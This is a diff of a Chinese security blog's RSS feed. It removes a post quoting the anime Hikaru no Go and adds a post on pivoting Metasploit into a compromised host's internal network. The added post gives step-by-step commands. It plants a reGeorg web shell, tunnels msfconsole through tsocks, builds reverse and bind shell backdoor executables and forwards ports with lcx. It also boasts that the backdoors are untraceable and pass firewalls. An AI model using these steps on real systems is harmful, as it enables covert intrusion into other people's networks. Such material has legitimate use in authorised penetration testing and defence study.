@@ -5,66 +5,9 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 20 Jan 2017 22:29:16 +0800</pubDate>
-    <lastBuildDate>Fri, 20 Jan 2017 22:29:16 +0800</lastBuildDate>
+    <pubDate>Fri, 20 Jan 2017 22:37:20 +0800</pubDate>
+    <lastBuildDate>Fri, 20 Jan 2017 22:37:20 +0800</lastBuildDate>
     <generator>Jekyll v3.3.1</generator>
-    
-      <item>
-        <title>《棋魂》</title>
-        <description>&lt;h3 id=&quot;0x00-record&quot;&gt;0x00 Record&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;播放时间:2001
-看完时间:2017-01-20
-相关内容:
-    棋魂第1部
-    剧场版:通往北斗之路(2014)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x01&quot;&gt;0x01&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sai
-进藤光
-矢塔亮
-
-[+] 做一下职业棋手?你知道棋手要付出多少汗血吗?忍耐,努力,辛酸,苦楚......最后还要克服绝望的煎熬,也未必能达到目标
-啊!                                                                                                   ---小亮
-
-[+] 为什么只给光这个机会呢?为什么是光,而我却必须要消失呢?为什么只给光这个机会我没有办法控制自己.我嫉妒光所
-拥有的……未来.不,不只是这样,我不想和光分开啊......                                                  ---藤原佐为
-
-[+] 亮:爸爸,我有围棋的天赋吗?
-
-亮爸:围棋天赋吗?我不知道你有没有围棋的天赋.不过即使没有的话,你也有了两种更可贵的东西,一是比任何人都更加努力不
-懈,二是比任何人都爱围棋.
-
-[+] 千年放浪,阅尽沉浮人生,不变的是我,醉心于棋盘上的千变万化,依恋于相知相伴的幸福,以及——对神之一手永无停息
-的追逐!&quot;                                                                                           ---藤原佐为
-
-[+] 阿光!我要下棋啦!                                                                                   ---佐为
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x02&quot;&gt;0x02&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;最难忘的是佐为对围棋的痴迷和执着,以及院生在职业棋士考试时大家都在很拼命
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Fri, 20 Jan 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/%E5%BD%B1%E8%A7%86/2017/01/20/%E6%A3%8B%E9%AD%82/</link>
-        <guid isPermaLink="true">http://localhost:4000/%E5%BD%B1%E8%A7%86/2017/01/20/%E6%A3%8B%E9%AD%82/</guid>
-        
-        <category>围棋</category>
-        
-        <category>感动</category>
-        
-        <category>励志</category>
-        
-        
-        <category>影视</category>
-        
-      </item>
     
       <item>
         <title>删除github项目历史版本中的敏感文件</title>
@@ -978,6 +921,105 @@ A0:config.ini在python3 3xp10it.py初次运行后会自动生成,用于设置bin
         <category>免杀</category>
         
         <category>bypass</category>
+        
+        
+        <category>web</category>
+        
+      </item>
+    
+      <item>
+        <title>代理msf进内网</title>
+        <description>&lt;h3 id=&quot;0x01-场景&quot;&gt;0x01 场景&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.肉鸡网络为内网环境,假设肉鸡ip为192.168.130.111
+2.肉鸡内网中有一台开启公网web服务机器,假设提供对应http://rouji.com,假设运行aspx
+3.尝试将msf用肉鸡的内网代理来控制目标内网
+4.msf控制端网络环境任意,可为内网,假设ip为192.168.3.166[此192.168与上面肉鸡的192.168不是同一个内网下的192.168]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02-准备&quot;&gt;0x02 准备&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;步骤如下:
+1.上传reGeorg的tunnel.aspx到http://rouji.com/tunnel.aspx
+2.控制端本地运行:python reGeorg.py -u http://rouji.com/tunnel.aspx -p 1080
+3.控制端[假设为kali系统]:
+apt-get install tsocks
+vi /etc/tsocks.conf配置server地址为127.0.0.1,端口为1080
+tsocks msfconsole
+4.两种控制模式:
+a)reverse类型payload连接
+b)bind类型payload连接
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03-reverse类型payload&quot;&gt;0x03 Reverse类型payload&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个reverse类型的exe,如下设置:
+payload: windows/shell/reverse_tcp
+rhost: 192.168.130.111[肉鸡本身的内网ip]
+lport: 1234
+假设生成houmen.exe
+
+2.将lcx和上面生成的houmen.exe上传到肉鸡192.168.130.111,运行:
+lcx -listen 300 1234
+houmen.exe
+
+3.在控制端msf中运行:
+use multi/handler
+set payload windows/shell/bind_tcp
+set rhost 192.168.130.111
+set lport 300
+run -j
+
+上面3个步骤完成后即可成功连接肉鸡
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04-bind类型payload&quot;&gt;0x04 Bind类型payload&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个bind类型的exe,如下设置:
+payload: windows/shell/bind_tcp
+lport: 1111
+假设生成houmen.exe
+
+2.将houmen.exe上传到肉鸡192.168.130.111,运行:
+houmen.exe
+
+3.在控制端msf中运行:
+use multi/handler
+set payload windows/shell/bind_tcp
+set rhost 192.168.130.111
+set lport 1111
+run -j
+
+上面3个步骤完成后即可成功连接肉鸡
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;0x05-about&quot;&gt;0x05 About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;优点:
+1.两种houmen.exe都无法溯源
+2.两种houmen.exe都可尝试用在目标网络环境有防火墙拦截规则下正常通信,将所有与肉鸡的通信流量变成控制端与肉鸡内网的一台
+web服务器的正常通信
+3.msf控制端可直接访问肉鸡内网所有资源(正常情况下要在控制一台肉鸡后将肉鸡设置为路由转发才由本地msf访问肉鸡内网)
+
+遗憾:
+就算是这样做,msf中的一些欺骗模块(eg.auxiliary/spoof/nbns/nbns_response)和其他的需要肉鸡设置为待访问资源的
+模块(eg.各种ie漏洞模块)在目标内网环境中依然没有用,因为为msf使用目标内网代理只是增加了msf对目标内网的访问权限,并
+没有使msf有目标内网其他机器可以访问msf的功能
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</guid>
+        
+        <category>msf</category>
+        
+        <category>proxy</category>
         
         
         <category>web</category>
